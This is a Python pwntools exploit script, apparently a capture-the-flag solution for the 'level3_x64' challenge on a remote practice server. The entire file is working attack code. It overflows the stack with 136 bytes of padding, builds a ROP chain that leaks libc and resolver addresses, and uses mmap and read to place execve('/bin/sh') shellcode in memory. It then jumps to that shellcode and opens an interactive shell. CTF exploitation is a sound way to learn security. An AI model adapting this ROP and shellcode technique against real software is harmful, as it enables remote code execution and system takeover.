from pwn import *

p = remote('pwn2.jarvisoj.com', 9884)
# p = process('./level3_x64')
p.recvuntil('Input:\n')
level3 = ELF('level3_x64')
libc = ELF('./libc-2.19.so')

write_plt = level3.plt['write']
write_got = level3.got['write']
read_got = level3.got['read']
bss_addr = 0x600a88


print 'write_plt: ' + hex(write_plt)
print 'write_got: ' + hex(write_got)


rop0 = 0x4006aa
rop1 = 0x400690
vuln_func = 0x4005e6
main = 0x40061a
got_2 = 0x600a50
payload = 'A'* 136
payload += p64(rop0)
#leak write address
payload += p64(0) + p64(1) + p64(write_got) + p64(8) + p64(write_got) + p64(1)
payload += p64(rop1)
payload += 'AAAAAAAA'
#leak _dl_runtime_resolve address
payload += p64(0) + p64(1) + p64(write_got) + p64(8) + p64(got_2) + p64(1)
payload += p64(rop1)
payload += 'AAAAAAAA'
# return 2 vuln
payload += p64(0) + p64(0) + p64(0) + p64(0) + p64(0) + p64(0) + p64(vuln_func)

p.sendline(payload)

write_addr = u64(p.recv(8))
_dl_runtime_resolve = u64(p.recv(8))
print hex(write_addr)
print hex(_dl_runtime_resolve)

mmap_addr = write_addr - (libc.symbols['write'] - libc.symbols['mmap'])
print hex(mmap_addr)
# ROPgadget --binary libc-2.19.so --depth=3 --only "pop|ret"|grep rax
# 0x000000000001b290 : pop rax ; ret
pop_rax_ret = write_addr - (libc.symbols['write'] - 0x000000000001b290)
print hex(pop_rax_ret)
p.recvuntil('Input:\n')
print '------------- payload 2 -------------'
sc = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"

sc_addr = 0xbeef0000
payload2 = 'A'* 136
gadget3 = _dl_runtime_resolve + 53
payload2 += p64(pop_rax_ret) + p64(mmap_addr) + p64(gadget3)
payload2 += p64(0) + p64(34) + p64(7) + p64(len(sc)) + p64(sc_addr) + p64(0) + p64(0)
payload2 += 'A'*16
payload2 += p64(pop_rax_ret) + p64(level3.plt['read']) + p64(gadget3)
payload2 += p64(0) + p64(0) + p64(len(sc)) + p64(sc_addr) + p64(0) + p64(0) + p64(0)
payload2 += 'A'*16
payload2 += p64(sc_addr)

p.sendline(payload2)
p.sendline(sc)
sleep(1)
p.interactive()
